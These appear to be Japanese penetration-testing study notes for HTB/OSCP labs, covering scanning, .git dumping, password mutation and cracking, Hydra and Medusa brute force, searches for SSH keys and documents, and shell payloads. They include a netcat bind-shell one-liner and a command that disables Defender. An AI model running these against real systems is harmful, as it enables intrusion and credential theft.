- [Nessus Essentials](https://community.tenable.com/s/article/Nessus-Essentials)
	- 公式のNessus脆弱性スキャナーの無料バージョン
	- 環境の脆弱性を特定しようとする
	- なんかサーバーにたてて使うらしい
-  [OpenVAS](https://www.openvas.org/)
	- 公開されているオープンソースの脆弱性スキャナー
	- 認証済みおよび非認証済みテストを含むネットワークスキャンを実行できる

セットアッププロセスが開始され、最大30分かかります
- 長すぎだろ
```shell-session
sudo apt-get install gvm && openvas
gvm-setup
```
OpenVas起動
```shell-session
gvm-start
```

`https://< IP >:8080`でアクセスできる

## .Gitが見つかったら

- .gitがあったら、.git/logs/HEADを参照したら、remoteのurl出てきたりすることがある
- GitHackを使って、gitファイルをダンプする
	- [https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)
```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python GitHack.py http://www.openssl.org/.git/
```

## XSS (Cross Site Script)

HTBやOSCPではXSSの脆弱性を使うことはないため、真っ先に除外する。  
XSSは他のユーザーが引っかかる必要があるが、HTBやOSCPには対象が存在しない。
- わけではないこともあることがわかった。SeaはXSSからのRCEで侵入できる。

## Searchsploit
### 複数の脆弱性を見つけたとき
 .txtよりもコードが書かれた脆弱性を選ぶべき
 迷った時は数字が後の方の方を選ぶべし
	 より最新で、上手くいく可能性が高いから

- searchsploitでExploitDBのリンクも表示するオプション
- でも、これつけるとローカルでの場所が表示されなくなっちゃう😢
  ```bash
  searchsploit -w <検索キーワード>
  ```
### PoCをダウンロードしたい時
 searchsploit -m <脆弱性の番号>
  - -m : ミラー
### 使い方だけ出力したい
	 | grep -i usage <PoC file>

- Authenticated~系は、攻撃者がログインした後にできる攻撃なので、ログインしてないと無理
### Searchsploitだけで全てだと思わない。Google検索もする
検索キーワード　: `SoftwareName Version CVE`

### Windowsの有名な脆弱性


| **脆弱性**                      | **説明**                                                                                                               | **条件**                                                                                                                                 |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **MS08-067**                 | SMB の脆弱性に対して多くの Windows バージョンに緊急パッチが適用されたもの。Conficker や Stuxnet でも悪用され、Windows ホストへの侵入が非常に容易になる。                     | - SMB (445番ポート) が開放<br>- Windows XP / Server 2003 / 2008 などで未パッチ                                                                       |
| **Eternal Blue**<br>MS17-010 | MS17-010 として知られ、NSA から流出した Shadow Brokers のダンプに含まれていたエクスプロイト。SMB v1 の欠陥を突いてコード実行が可能。WannaCry や NotPetya などの攻撃で悪用された。 | SMBv1 が有効<br>Windows 7 / Server 2008 R2 などで未パッチ- 無認証で攻撃可能<br>windows/smb/ms17_010_eternalblueがダメでもwindows/smb/ms17_010_psexecは行ける可能性ある |
| **PrintNightmare**           | Windows Print Spooler のリモートコード実行脆弱性。プリンタ ドライバのインストール経由で SYSTEM 権限を奪取可能。2021年に猛威を振るった。                                | - Print Spooler サービスが有効<br>- （多くの場合）低権限シェルまたは有効な資格情報が必要                                                                                |
| **BlueKeep**                 | CVE-2019-0708。RDP の特定チャネルの欠陥を突いてコード実行を行う。Windows 2000 ～ Server 2008 R2 まで広範囲に影響。                                     | - RDP (3389番ポート) が開放<br>- Windows 7 / Server 2008 R2 などで未パッチ                                                                           |
| **Sigred**                   | CVE-2020-1350。DNS サーバー（通常はドメインコントローラ）の SIG レコード処理を悪用。成功するとドメイン管理者権限を得る可能性がある。                                        | - Windows DNS サーバーが未パッチ- 外部から DNS レコードを注入可能または制御下に置ける環境                                                                                |
| **SeriousSam**               | CVE-2021-36934。C:\Windows\system32\config のパーミッション不備により、非特権ユーザーでも SAM を読み取れる。Volume Shadow Copy 経由でダンプが可能。           | - Windows 10 / Server 2019 など特定バージョンで未修正<br>- Volume Shadow Copy が有効- フォルダの実行許可設定ミス                                                    |
| **Zerologon**                | CVE-2020-1472。Netlogon RPC (MS-NRPC) の暗号化欠陥を突く。ドメインコントローラに対して総当たりが可能で、成功するとドメイン管理者権限まで奪取し得る。                         | - ドメインコントローラが未パッチ- MS-NRPC (Netlogon) にアクセス可能<br>- 攻撃成功でドメイン管理者権限取得の可能性                                                                |




# エクスプロイト
## ステガノグラフィーツール
CTFでは、意味ありげな画像がポンと渡されて、何も情報がない場合、ステガノグラフィーのこともある。

ファイルの埋め込み
```bash
steghide embed -cf cvr.jpg -ef emb.txt
```
データの抽出:
```bash
steghide extract -sf stg.jpg
```
### パスフレーズがかかってて、突破できない時
何が入ってるのかを確認する
```bash
sudo apt install stegcracker -y
sudo apt install steghide -y
sudo steghide info *.jpg
```
何も入力しないでEnterを押すことで突破できないか試す
```bash
sudo steghide extract -sf *.jpg
```
ヒントの確認
	- 隠されたパスフレーズがファイルのメタデータや埋め込まれたコメントに含まれている場合がある。以下のコマンドでチェック
```bash
strings HackerAccessGranted.jpg
exiftool HackerAccessGranted.jpg
```

辞書攻撃
- よく使用される辞書ファイル
- `rockyou.txt`（多くのステガノグラフィー攻撃で利用される）
```bash
stegcracker HackerAccessGranted.jpg /path/to/wordlist.txt
```
 
## 文字の画像などでモザイクがかかってて複合したい時
 - [https://github.com/spipm/Depix.git]を使う
 ```sh
git clone https://github.com/spipm/Depix.git
cd Depix
 ```

```
python3 depix.py -p <PATHTOIMAGE>/image.png -s
./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o
<DESIREDPATH>/output.png
```
## ファイル転送
- [[File Transfer]]

## デフォルトのパスワードリスト
- サービスのバナーを取得できたら、まず、デフォルトの認証情報を試す
デフォルトのパスワードがない場合は以下を試す
```shell-session
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```
- https://github.com/ihebski/DefaultCreds-cheat-sheet?tab=readme-ov-file
	- webサービスの最もよく知られているベンダーのデフォルトの資格情報の1つのドキュメント
	- ペンテスト/レッドチームエンゲージメント中にペンテスターを支援する

デフォルトの資格情報チートシートをpipでインストールして、検索できる
例
```shell
pip3 install defaultcreds-cheat-sheet
```

検索するとき
```sh
creds search tomcat
```

- Wifiのデフォルトの認証情報
	- https://www.softwaretestinghelp.com/default-router-username-and-password-list/
## パスワードリストを変異させる(Hashcat)
人がパスワードを設定するときに、複雑にしようとするが、その複雑にするプロセスには一貫した共通点がある
その共通点をトレースして、単純なパスワードを複雑化する
まず、ベースとするpassword.lstを用意する
```shell-session
cat password.list
```

下のルールを`custom.rule`に加えて、このルールに従って、password.lstを複雑化する

| **機能** | **説明**                     |
| ------ | -------------------------- |
| `:`    | 何もしない。                     |
| `l`    | すべての文字を小文字にしてください。         |
| `u`    | すべての文字を大文字にしてください。         |
| `c`    | 最初の文字を大文字にして、他の文字を小文字にします。 |
| `sXY`  | XのすべてのインスタンスをYに置き換えます。     |
| `$!`   | 最後に感嘆符を追加します。              |
例 : cutom.ruleの中身
```shell-session
snowyowl644@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

custom.ruleをベースとなるpassword.lstに適用する
```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

もちろん、事前に作成されたルールリストもある
最もよく使われるルール
- best64.rule
パスワードの解読とカスタムワードリストの作成は、ほとんどの場合、推測ゲームであることに注意することが重要

**CeWL**
[CeWL](https://github.com/digininja/CeWL)と呼ばれる別のツールを使用して、会社のWebサイトから潜在的な単語をスキャンし、別のリストに保存できる
- スパイダーの深さ（`-d`）、単語の最小長（`-m`）、見つかった単語の小文字（--`--lowercase`）の保存、結果を保存するファイル（`-w`）など、いくつかのパラメータを指定する
```shell-session
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

## ハッシュのクラック(john)

**単純なハッシュ**
hashes.txtに直す
```bash
echo "ハッシュ" > hashes.txt
```

#### シングルクラックモード
 ハッシュの形式を指定して、johnを使って解析
 - 組み込みのワードリストおよび --wordlist オプションで指定した追加のワードリストと比較してハッシュをクラックしようとする
- さらに、--rules オプションで指定されたルール（もしあれば）を用いて候補パスワードを生成する
```bash
john --format=sha256 hashes_to_crack.txt
```

ハッシュの形式が不明な場合
```bash
hashid -m 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
```
代表的なハッシュアルゴリズム↓

| **ID**   | 暗号化ハッシュアルゴリズム                                                         |
| -------- | --------------------------------------------------------------------- |
| `$1$`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `$2a$`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
| `$5$`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$6$`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$sha1$` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `$y$`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `$gy$`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `$7$`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

#### ワードリストモード
- 複数の単語リストを使用してパスワードを解読する"辞書攻撃"
- 正しい単語が見つかるまで、リスト内のすべての単語を1つずつ試す
- シングルクラックモードよりも効果的
	- より多くの単語を使うが、それでも比較的基本的だから
```shell-session
john --wordlist=<wordlist_file> --rules <hash_file>
```

- 単語リストは、1行に1語ずつ、プレーンテキスト形式にすることができる
- 複数の単語リストは、カンマで区切って指定できる
	- ルールセットを指定したり、組み込みのマングリングルールをワードリストの単語に適用したりできる
	- 数字の追加、文字の大文字化、特殊文字の追加などの変換を使用して、候補パスワードを生成できる
#### Incremental Mode
- 文字セットから可能なすべての文字の組み合わせを試すことで、パスワードを試す
- すべてのジョンモードの中で最も効果的でありながら、最も時間のかかるモード
- 最短のものから始めて、すべての可能な組み合わせを順番に試すため、パスワードが何であるかを知っているときに最も効果的
- すべての組み合わせがランダムに試されるブルートフォース攻撃よりもはるかに高速になる
	- 0~Zまでやって、また桁増やして0~Zまでやってみていくというブルートフォースに順序を持たせただけ
- インクリメンタルモードを使用して、標準のジョンモードを使用して解読するのが難しい脆弱なパスワードを解読することもできる
	- 例えば、ハッシュの答えが辞書には載ってない'aa11'とかだったら、辞書モード時だと無理で、インクリメンタルモードじゃないと無理だよねって話
```shell-session
john --incremental <hash_file>
```
- 指定されたハッシュファイル内のハッシュを読み、単一の文字から始めて、反復ごとに増分するすべての可能な文字の組み合わせを生成できる
- パスワードの複雑さ、マシン構成、および設定された文字数に応じて、完了までに長い時間がかかる可能性があることに注意することが重要
- デフォルトの文字セットは`a-zA-Z0-9`なので、特殊文字を使うときは、カスタム文字セットを使用する必要がある

### レインボーテーブル攻撃サイト
- https://hashes.com/en/decrypt/hash
- https://crackstation.net/
- https://md5decrypt.net/en/

# ブルートフォース
## **ユーザー名リストの自動拡張**

ユーザー名リストは**手動で作成することも可能**だが、**自動生成ツールを活用**すれば効率的に一般的なユーザー名フォーマットを作成できる。

### 1. わかっているユーザーネームをファイルにまとめる
```shell-session
snowyowl644@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```
### **2. 自動リスト生成ツールの実行**
#### Username Anarchy
- ユーザー名を自動で生成するツール
- **`Username Anarchy`**（Rubyベースのツール）を使用すると、**実名リストから複数のユーザー名パターンを生成可能**
- Gitを使って攻撃ホストにツールをクローンし、実際の名前リストに適用する

1. **ツールをGitでクローン**
```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```
1. **リストを使ってユーザー名を生成**
```bash
./username-anarchy -i ../username.list > username_anarchy.list
```

名前を使って、ユーザー名を生成する
```shell-session
./username-anarchy Jane Smith > jane_smith_usernames.txt
```
→ 実際の名前リストを基に、**一般的なユーザー名形式を自動的に作成**

#### CUPP
- CUPPとは？
	- ターゲットに関する個人情報をもとに、**カスタムパスワードリスト**を自動生成するツール
	- ブルートフォース攻撃の精度を高めるための「ターゲット特化型」辞書作成に使う
	- OSINT（オープンソース情報収集）と組み合わせると効果大

- 特徴
	- 被対象者のプロフィールからパスワードの傾向を想定
	- 誕生日やペット名、趣味、リート語、記号追加など多彩な変化を加えた単語を自動生成
	- 大量の情報を手動で組み合わせる手間を省ける

- CUPPに入力する情報（対話モード `cupp -i`）
	- 名前・名字・ニックネーム
	- 誕生日（本人、恋人、子どもなど）
	- パートナーの名前・誕生日
	- ペットの名前
	- 勤務先の会社名
	- 好きな言葉・趣味などのキーワード（任意）
	- 特殊文字の追加、数字の追加、リートモード（例：`a`→`@`, `e`→`3`）の使用設定

- インストール方法（Linuxの場合）
	```bash
sudo apt install cupp -y
	```

- 実行例（対話形式）
```bash
cupp -i
```
- プロンプトに従って情報を入力するだけで `.txt` 形式の辞書ファイルが生成される

- 生成されるパスワード例
	- janesmith, Jane1990, j4n3, smith1212!, hackerblue123, Spot@1990 など
	- 情報に基づいた高精度なパスワード候補が多数

- 応用テクニック
	- 企業のパスワードポリシーに合わせてフィルタリング
```bash
grep -E '^.{6,}$' jane.txt | grep '[A-Z]' | grep '[a-z]' | grep '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane_filtered.txt
```

- Hydraなどのブルートフォースツールと組み合わせて使う
```bash
hydra -L usernames.txt -P jane_filtered.txt IP -s PORT -f http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

- まとめ
	- CUPPは「精度重視」の攻撃をしたいときに効果的
	- SNSや公開情報をうまく使って情報を集めるのがカギ
	- ワードリスト作成を自動化できるので、初心者でも扱いやすい
	- 
## 辞書拡張
```sh
john --wordlist=password.list --rules=custom --stdout | sort -u > mut_password.list
```

```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```


## ブルートフォースの実行
#### crackmapexec
```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
protoには、サービス名を指定する
winrmをブルートフォース
```shell-session
snowyowl644@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

#### hydra
また、単一のユーザー名・パスワードの場合は小文字の-l、-pを使う
```shell-session
hydra -L user.list -P pass.list ftp://$Target_IP -v
```

hydraオプションの基本
```shell-session
hydra [login_options] [password_options] [attack_options] [service_options]
```

|                    |                                                                |                                                                                             |
| ------------------ | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `l LOGIN``-L FILE` | ログインオプション：単一のユーザー名（`-l`）またはユーザー名のリスト（`-L`）を含むファイルを指定します。       | `hydra -l admin ...``hydra -L usernames.txt ...`                                            |
| `-p PASS``-P FILE` | パスワードオプション：単一のパスワード（`-p`）またはパスワードのリストを含むファイル（`-P`）のいずれかを提供します。 | `hydra -p password123 ...``hydra -P passwords.txt ...`                                      |
| `-t TASKS`         | タスク：実行する並列タスク（スレッド）の数を定義し、攻撃を高速化する可能性があります。                    | `hydra -t 4 ...`                                                                            |
| `-f`               | ファストモード：最初のログインが見つかったら、攻撃を停止します。                               | `hydra -f ...`                                                                              |
| `-s PORT`          | ポート：ターゲットサービスにデフォルト以外のポートを指定します。                               | `hydra -s 2222 ...`                                                                         |
| `-v``-V`           | 詳細な出力：試行と結果を含む、攻撃の進行状況に関する詳細情報を表示します。                          | `hydra -v ...`または`hydra -V ...`（さらに冗長性のために）                                                 |
| `service://server` | ターゲット：サービス（例：`ssh`、`http`、`ftp`）とターゲットサーバーのアドレスまたはホスト名を指定します。  | `hydra ssh://192.168.1.100`                                                                 |
| `/OPT`             | サービス固有のオプション：対象サービスに必要な追加オプションを提供します。                          | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"`（HTTPフォームベースの認証用） |
|                    |                                                                |                                                                                             |

##### Hydra サービス別コマンド

| **サービス**          | **コマンド例**                                                                                                    |
| ----------------- | ------------------------------------------------------------------------------------------------------------ |
| **FTP**           | hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100                                             |
| **SSH**           | hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100                                              |
| **HTTP-GET/POST** | hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" |
| **SMTP**          | hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com                                          |
| **POP3**          | hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com                               |
| **IMAP**          | hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com                               |
| **MySQL**         | hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100                                            |
| **MSSQL**         | hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100                                              |
| **VNC**           | hydra -P /path/to/password_list.txt vnc://192.168.1.100                                                      |
| **RDP**           | hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100                                             |
辞書を作らなくてもこんな感じでもできる
- 6〜8文字の全パターンを自動生成（英小文字・英大文字・数字）
```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

- **このコマンドがやってること**
	- `-l administrator` → ログイン名として「administrator」を指定
	- `-x 6:8:...` → 6〜8文字の全パターンを自動生成（英小文字・英大文字・数字）
	- `192.168.1.100` → 攻撃対象のIPアドレス
	- `rdp` → RDPサービスを対象に指定

##### Basic認証に対するブルートフォース
辞書の取得
```sh
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

ブルートフォースの実行
```shell-session
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```
- `-l basic-auth-user` → ログイン試行に使うユーザー名を指定
- `-P 2023-200_most_used_passwords.txt` → 使用するパスワードリスト
- `127.0.0.1` → ターゲットのIP（この場合はローカルホスト）
- `http-get /` → HTTPのGETメソッドでルートパス（`/`）を攻撃対象に
- `-s 81` → ポート番号を明示的に指定（通常80だが、ここでは81を使用）


##### カスタムログインフォームへのブルートフォース
- カスタムログインフォームとは？
	- Webサイトが使っている、独自デザインのログイン画面
	- 見た目は違っても、内部的には同じように動作していることが多い

- Hydraで攻撃できる理由
	- Hydraはログインフォームに自動でユーザー名とパスワードを送って試せるツール
	- `http-post-form`というモードを使えば、フォーム送信に特化したブルートフォースが可能

- 攻撃のために必要な情報
	- ログイン先のURLパス（例：`/login` や `/`）
	- 入力項目の名前（例：`username`, `password`）
	- 失敗時に表示されるメッセージ（例：`Invalid credentials`）

- 情報の集め方
	- ブラウザで開いて右クリック →「検証」ツールでHTMLコードを見る
	- 「ネットワーク」タブでPOSTリクエストを確認
	- Burp Suiteなどのプロキシツールでリクエスト内容を詳細に調べる

- Hydraコマンドの基本構文
	- `hydra -L ユーザー名リスト -P パスワードリスト ターゲットIP http-post-form "パス:パラメータ:条件"`

- パラメータの書き方
	- 例：`/:username=^USER^&password=^PASS^:F=Invalid credentials`
		- `username=^USER^` → ユーザー名入力欄
		- `password=^PASS^` → パスワード入力欄

###### 「F=」と「S=」オプション
- F=（Failure Condition）とは？
	- 「この文字列がレスポンスに含まれていたらログイン失敗」と判断するための条件
	- 多くのログインフォームは失敗時に何らかのエラーメッセージを返す
		- 例：`"Invalid credentials"`, `"Incorrect password"`, `"Login failed"` など
	- Hydraはこの文字列を探して、失敗したら次の組み合わせに進む
	- 使用例：
	```bash
	hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
	```

- S=（Success Condition）とは？
	- 「この文字列がレスポンスに含まれていたらログイン成功」と判断するための条件
	- 成功時に表示されるキーワードや、リダイレクト（HTTP 302）をチェックするのに使う
		- 例：`"Welcome"`, `"Dashboard"`, `S=302` など
	- S=を使うのは、**失敗メッセージがない** or **成功時のパターンが明確なとき**に便利

	- 使用例（① 成功時に「Dashboard」と表示される）：
	```bash
	hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
	```

	- 使用例（② 成功時にHTTPステータスコード302でリダイレクト）：
	```bash
	hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
	```

- F= と S= の使い分け
	- ほとんどのケースでは **F=（失敗条件）だけ指定**すればOK
	- 特定の成功パターンがあるときや、失敗メッセージが見つからないときに S= を使う
	- **両方併用も可能**（例：`F=Login failed:S=Welcome`）

- チェックポイント（初心者向け）
	- Hydraはレスポンスの「内容」や「ステータスコード」を使って判断している
	- 条件に合わないと正しい結果が出ないので、実験前にブラウザやBurpでしっかり調べよう！

- おまけ：テスト時のポイント
	- 間違ったパスワードでログインして、**エラーメッセージを確認**
	- 正しい情報を入力したときの**レスポンスの違い**を見つける（リダイレクトや文字の変化）

辞書の取得
```shell-session
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

実行
```shell-session
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```


## medusa
| **項目**       | **Hydra**                  | **Medusa**                     |
| ------------ | -------------------------- | ------------------------------ |
| 💡 特徴        | 柔軟でシンプルなコマンド構文。対応プロトコルが広い。 | 超高速＆並列処理に強い。大量ターゲットの一括スキャンが得意。 |
| 🚀 速度        | 並列処理はあるが、Medusaより若干遅い      | 圧倒的に速い（数千スレッドでも安定）             |
| 🧠 学習コスト     | 初心者向け。わかりやすい構文。            | やや複雑。オプションが多め                  |
| 🛠️ 対応プロトコル  | 50以上対応（Webフォーム、SSH、RDPなど）  | Hydraに近いがやや少なめ（実用的には十分）        |
| 🔁 大量ホスト対応   | スクリプトなどで対応可能               | 複数ホストを一括で簡単に処理できる（-H）          |
| 🌐 Webフォーム対応 | http-post-formで高機能に対応      | web-formモジュールもあるが柔軟性はHydraが上   |
| 📦 標準搭載      | Kali, Parrotなどにプリインストール    | 同じく多くのペンテスト用OSに搭載済み            |
| 🔍 デバッグ・出力   | Verboseログが細かくてわかりやすい       | ログはややシンプル。高速処理に特化              |
```sh
medusa [ターゲット関連オプション] [認証情報関連オプション] -M モジュール [モジュール固有オプション]
```

| **パラメータ** | **説明**                              | **使用例**                                                   |
| --------- | ----------------------------------- | --------------------------------------------------------- |
| -h or -H  | 単一のターゲット（-h）またはターゲットのリストファイル（-H）を指定 | medusa -h 192.168.1.10 ... または medusa -H targets.txt ...  |
| -u or -U  | 単一ユーザー名（-u）またはユーザーリストファイル（-U）を指定    | medusa -u admin ... または medusa -U users.txt ...           |
| -p or -P  | 単一パスワード（-p）またはパスワードリストファイル（-P）を指定   | medusa -p password123 ... または medusa -P passwords.txt ... |
| -M        | 攻撃に使うモジュールを指定（例：ssh, ftp）           | medusa -M ssh ...                                         |
| -m        | モジュール専用の追加オプション（ダブルクォートで囲む）         | **HTTPフォーム送信などに使う：**medusa -M http -m "POST /login ..."   |
| -t        | 並列スレッド数（並列で試行できる数）                  | medusa -t 4                                               |
| -f or -F  | 成功時に停止（-f: 現在のホストのみ、-F: すべてのホストで停止） | medusa -f ... または medusa -F ...                           |
| -n        | 非標準ポートを指定（例：2222など）                 | medusa -n 2222                                            |
| -v        | 詳細出力（最大6レベル）                        | medusa -v 4                                               |
#### medusaのサービス別コマンド
| **モジュール名** | **サービス/プロトコル** | **説明**                             | **使用例**                                                                                                                   |
| ---------- | -------------- | ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| ftp        | FTP            | ファイル転送用プロトコルのログイン情報をブルートフォース       | medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| http       | HTTP           | Webアプリのフォームログイン（GET/POST）をブルートフォース | medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^ |
| imap       | IMAP           | メールサーバーのIMAP認証に対して試行               | medusa -M imap -h mail.example.com -U users.txt -P passwords.txt                                                          |
| mysql      | MySQL          | データベース（MySQL）の認証情報を試行              | medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt                                                                 |
| pop3       | POP3           | メール取得プロトコルへのブルートフォース               | medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt                                                          |
| rdp        | RDP            | Windowsのリモートデスクトップログインをブルートフォース    | medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| ssh        | SSH            | セキュアシェルへの認証を試行（ポピュラー）              |                                                                                                                           |
| svn        | Subversion     | バージョン管理ツールSVNの認証に対して攻撃             | medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| telnet     | Telnet         | 古いリモート端末プロトコルへの試行                  | medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt                                                               |
| vnc        | VNC            | リモートデスクトップ（VNC）へのブルートフォース          | medusa -M vnc -h 192.168.1.100 -P passwords.txt                                                                           |
| web-form   | Webログインフォーム    | HTTP POST を使うログインフォームへの攻撃          | medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"   |
## 有用なファイルの検索
エンコードされたファイルの検索
```shell-session
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

SSHキーの検索
```shell-session
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

暗号化されたSSHの検索
```shell-session
cat /home/cry0l1t3/.ssh/SSH.private
```

SSH の秘密鍵 (SSH.private) を John the Ripper でクラックできる形式 (hash) に変換する
SSH.privateは、id_rsaに置き換えられる
出力を ssh.hash に保存。
```shell-session
ssh2john.py SSH.private > ssh.hash
cat ssh.hash 
```

SSHキーのクラック
```shell-session
john --wordlist=rockyou.txt ssh.hash
```

## パスワード付きファイルのクラック
- パスワードで保護されたファイルや暗号化されたファイルも解読することもできる
```shell-session
<tool> <file_to_crack> > file.hash
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
```

```sh
john --wordlist=<wordlist.txt> server_doc.hash 
```

また、それぞれのファイルにあったjohnを見つけて使用することもできる
それぞれのツールにあったjohnを検索する
```shell-session
locate *2john*
```

Microsoft Office ドキュメントのクラッキング
```shell-session
office2john.py Protected.docx > protected-docx.hash
cat protected-docx.hash
```

```shell-session
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show
```

PDF のクラッキング
```shell-session
pdf2john.py PDF.pdf > pdf.hash
cat pdf.hash 
```

```shell-session
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show
```
**複雑な形式**
1. まず自分の目的に合ったjohnのスクリプトを探して、johnが解析できる.johnの形に変換する
```bash
sudo find / -iname *2john* -type f 2>/dev/null
```
1. johnでワードリストを指定して解析
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt 探したい.john
```


## パスワード付き圧縮ファイルのクラック
zipファイルのクラック
- パスワード付きzipをjohnが解析する形にする
- rockyou.txtで辞書攻撃する
- クラックされたハッシュの表示
```shell-session
zip2john ZIP.zip > zip.hash
cat zip.hash 
john --wordlist=rockyou.txt zip.hash
john zip.hash --show
```

```shell-session
john --wordlist=rockyou.txt zip.hash
```

gzipファイルのクラック
```shell-session
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

bitlockerファイルのクラック
```shell-session
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
cat backup.cracked 
```

パスワードを解読すると、暗号化されたドライブを開く
BitLocker で暗号化された仮想ドライブをマウントする最も簡単な方法は、それを Windows システムに転送してマウントする

# ペイロード
## シェルの設置
### リバースシェル
攻撃者側でポートを開いて待ち受けて、そこにターゲットがアクセスすることでシェルを取得する
- なんか443で待ち受けておくと、ターゲットにファイアーウォールがあったとしてもスルーすることができる
- https://www.revshells.com/
ターゲットがWindowsの場合は、AntiVirus(AV)が働く可能性があるから、その時は、PSを右クリックから管理者権限で起動して、以下のコマンドを打つことで、AVをオフにできるって
```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```


### バインドシェル
ターゲット側でポート開いて待ち受けて、そこに攻撃者がアクセスすることで、シェルを取得する
バインドシェルの方が防御されやすい
- 接続は受信されるため、リスナーの起動時に標準ポートを使用しても、ファイアウォールによって検出およびブロックされる可能性が高くなるから

コマンド
- ターゲット側
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ターゲットのIP> 7777 > /tmp/f
```
- 攻撃者側
```shell-session
nc -nv <ターゲットのIP> 7777
```

### Webシェル
- webページ上でのシェル
- 普通に使い勝手悪くね？
- リバースシェルでいいんじゃねとか思っちゃうけど
	- そもそもリバースシェルのコマンドを仕込めない（アップロードしかできない、またはコマンド実行の権限が限定的）
	- 外向き通信（外部への接続）が制限されている
	- Web インターフェース越しに操作できる手段が欲しい（内向き通信しか許可されていないネットワークなど）
- PHPWebshell
	- https://github.com/WhiteWinterWolf/wwwolf-php-webshell
Windows
- Laudanum
